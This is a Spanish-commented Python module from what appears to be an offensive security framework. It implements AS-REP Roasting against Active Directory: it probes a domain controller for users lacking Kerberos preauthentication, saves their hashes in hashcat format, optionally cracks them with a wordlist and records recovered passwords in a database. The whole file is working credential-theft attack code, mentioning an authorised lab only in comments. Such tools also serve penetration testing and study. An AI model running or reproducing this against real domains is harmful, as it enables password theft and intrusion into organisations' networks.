# -*- coding: utf-8 -*-
"""
Módulo ad/asreproast
====================
AS-REP Roasting (T1558.004): pide AS-REQ sin preautenticación para una
lista de usuarios; los que tienen deshabilitada la preautenticación
reciben un AS-REP directamente, cuyo enc-part se guarda en formato
hashcat -m 18200 ($krb5asrep$) para crackear SIN conexión al dominio.

El módulo NO crackea: extrae material y lo deja listo para hashcat/John
en el laboratorio autorizado. Cliente Kerberos propio (core.krb5).

Riesgo: MEDIO (mismo ruido que kerberos_userenum; el crackeo es offline).
ATT&CK: T1558.004 (AS-REP Roasting).
"""

import socket

from core.base_module import BaseModulo, ModuloError
from core import krb5
from modules.ad.kerberos_userenum import cargar_lista

SALIDA_RAIZ = __import__("pathlib").Path(__file__).resolve().parent.parent.parent / "output" / "ad"


class AsRepRoast(BaseModulo):
    """Detecta usuarios sin preautenticación y extrae los hashes AS-REP."""

    NAME = "ad/asreproast"
    CATEGORIA = "ad"
    DESCRIPCION = ("AS-REP Roasting: localiza usuarios con preautenticación "
                   "deshabilitada y extrae su hash en formato hashcat -m 18200. "
                   "CRACK=true permite probar una wordlist en local (puro Python).")
    RIESGO = "medio"
    AUTOR = "REDHAVOC"
    REFERENCIA = "harmj0y/ASREPRoast · MITRE ATT&CK T1558.004"
    ATTCK = ("T1558.004",)

    def definir_opciones(self) -> None:
        self.opciones.declarar("RHOST", "", True, "IP o nombre del controlador de dominio (KDC)")
        self.opciones.declarar("REINO", "", True, "Reino Kerberos en MAYÚSCULAS (p. ej. CORP.LOCAL)")
        self.opciones.declarar("USUARIOS", "", True,
                               "Lista separada por comas o fichero @ruta")
        self.opciones.declarar("TCP", "true", False, "Usar TCP (AS-REP suelen superar el MTU)")
        self.opciones.declarar("ETIPO", "23", False, "etype solicitado (23 = RC4, formato 18200)")
        self.opciones.declarar("CRACK", "false", False,
                               "Probar WORDLIST contra los hashes en local (puro Python)")
        self.opciones.declarar("WORDLIST", "templates/wordlists/ad_claves.txt", False,
                               "Fichero de contraseñas para CRACK")

    def ejecutar(self) -> dict:
        host = self._objetivo_host(self.opt("RHOST"))
        reino = self.opt("REINO").strip().upper()
        usuarios = cargar_lista(self.opt("USUARIOS"))
        if not usuarios:
            raise ModuloError("Lista de usuarios vacía")
        tcp = self.opt_bool("TCP", True)
        etipo = self.opt_int("ETIPO", 23) or 23
        crackear = self.opt_bool("CRACK", False)
        timeout = self.opt_int("TIMEOUT", 5) or 5

        hashes, sin_preauth, probados = [], [], 0
        for usuario in usuarios:
            probados += 1
            paquete = krb5.construir_as_req(usuario, reino, etipo=etipo)
            try:
                respuesta = krb5.enviar_kdc(host, paquete, timeout=timeout,
                                            tcp=tcp, puerto=88)
            except (socket.timeout, TimeoutError):
                continue
            except OSError:
                continue
            resultado = krb5.interpretar_respuesta(respuesta, usuario, reino)
            if resultado["tipo"] == "asrep":
                sin_preauth.append(usuario)
                hashes.append(resultado["hash"])

        if hashes:
            SALIDA_RAIZ.mkdir(parents=True, exist_ok=True)
            destino = SALIDA_RAIZ / f"asrep_{reino.lower()}.txt"
            destino.write_text("\n".join(hashes) + "\n", encoding="utf-8")
        else:
            destino = None

        crakeados = {}
        if crackear and hashes:
            candidatos = cargar_lista(self.opt("WORDLIST")) or []
            crakeados = krb5.crackear_hashes_kerberos(hashes, candidatos)
            db = self.workspace
            if db is not None:
                try:
                    for pwd_crackeada in set(crakeados.values()):
                        db.add_cred(host, "(asrep)", pwd_crackeada, "AS-REP crack")
                except Exception:  # noqa: BLE001 — el roasting no falla por la DB
                    pass

        db = self.workspace
        if db is not None:
            try:
                db.add_host(host, notas=f"KDC {reino}")
                db.add_service(host, 88, "KERBEROS")
            except Exception:  # noqa: BLE001
                pass

        return {
            "resumen": (f"AS-REP roast {reino}: {len(sin_preauth)}/{probados} usuarios "
                        f"sin preautenticación"
                        + (f" → hashes en {destino}" if destino else "")),
            "reino": reino,
            "probados": probados,
            "sin_preauth": sin_preauth,
            "hashes": hashes,
            "crackeados": [{"hash": h, "password": p} for h, p in crakeados.items()],
            "fichero": str(destino) if destino else "",
            "como_crackear": ("hashcat -m 18200 hashes.txt diccionario.txt "
                              "(SOLO en el laboratorio autorizado)")
            if not crakeados else "",
        }
